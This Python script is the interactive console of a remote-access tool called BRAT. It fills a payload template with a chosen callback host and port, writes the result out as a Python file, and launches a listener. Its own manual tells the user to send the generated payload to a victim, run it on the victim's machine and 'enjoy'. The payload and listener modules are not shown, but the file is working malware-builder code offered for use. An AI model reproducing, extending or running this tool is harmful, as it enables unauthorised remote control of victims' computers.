#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
from modules import misc
from time import sleep
import imp
imp.reload(sys)
# sys.setdefaultencoding("utf-8")

pf = misc.programFunctions()
pf.clrscrn()

host = "127.0.0.1"
port = 1337
output = "payload.py"

try:
    payload = open('modules/payload.py', 'r').read()
    open('modules/payload.py', 'r').close()

except FileNotFoundError:
    print("[i] Payload not found!")
    sys.exit(0)

def logo():
    print("\n[i] Basic Remote Administration Tool (BRAT) v1.2\n[i] Catayao56\n\n")

def help():
    print("""\
  Commands :
       help             : Show this help menu.
       manual           : Show the basic usage of this program..
       clear            : Clear the screen.
       set HOST         : Set Server Host (e.g set HOST 127.0.0.1)
       set PORT         : Set Server Port (e.g set PORT 1337)
       set OUTPUT       : Set Your Payload's Output path (e.g set OUTPUT /home/payload)
       show values      : Show current values
       generate payload : Generate a payload
       start listener   : Start Server
       
       quit             : Close BRAT \n""")

def manual():
    print("""
Manual:
        [1] Set HOST, PORT, and OUTPUT.
        [2] Double-check current values.
        [3] Generate payload and send it to victim.
        [4] Start server.
        [5] Run payload on victim's machine and enjoy!""")
       
def main():
    global host, port, output

    while True:
        cmd = input("[BRAT] >>> ").lower()

        if cmd == "help":
            help()

        elif cmd == 'manual':
            manual()

        elif cmd == 'clear':
            pf.clrscrn()
            logo()
            continue

        elif "set host" in cmd:
            host = cmd.split()[-1]

        elif "set port" in cmd:
            port = int(cmd.split()[-1])

        elif "set output" in cmd:
            output = cmd.split()[-1]
            output = output + '.py'

        elif cmd == "show values":
            print("\n[+] HOST   : %s\n[+] PORT   : %s\n[+] OUTPUT : %s\n"%(host, port,output))

        elif cmd == "generate payload" or cmd == "generate":
            if host != " " and port != " " and output != " ":
                print("[+] Generating Payload...")
                if '.py' not in output:
                    output = output + '.py'

                sleep(1)
                try:
                    open(output, 'r').read()
                    open(output, 'r').close()
                
                except FileNotFoundError:
                    open(output, 'w').write('')
                    open(output, 'w').close()

                print(("[*] Using Configuration...\n |_ HOST   : "+host+"\n |_ PORT   : "+str(port)+"\n |_ OUTPUT : "+output))
                sleep(3)
                """
                os.system("sh modules/gen.sh "+host+" "+str(port)+" "+output)
                """

                payload_temp = payload.format(host, port)
                open(output, 'a').write(payload_temp)
                open(output, 'a').close()
                print("[+] Generation Success...")
                sleep(1)
                main()
            else:
                print("\n[!] HOST   : %s\n[!] PORT   : %s\n[!] OUTPUT : %s\n"%(host,port,output))

        elif cmd == "start" or cmd == "run" or cmd == "start listener":
            if host != " " and port != " ":
                if os.name == "nt":
                    subprocess.Popen([sys.executable, 'modules/listener.py', host, str(port)], creationflags=subprocess.CREATE_NEW_CONSOLE)
                else:
                    os.system(sys.executable + " modules/listener.py %s %s %s"%(host, str(port), output))
            else:
                print("\n[!] Host : %s\n[!] Port : %s\n"%(host,port))

        elif cmd == 'quit' or cmd == 'exit':
            sys.exit(0)

        else:
            print("[!] Invalid Input!")
            continue

def start_main():
    try:
        logo()
        main()

    except KeyboardInterrupt:
        print("\n[!] CTRL+C Detected...")
        sys.exit()

if __name__ == "__main__":
    start_main()
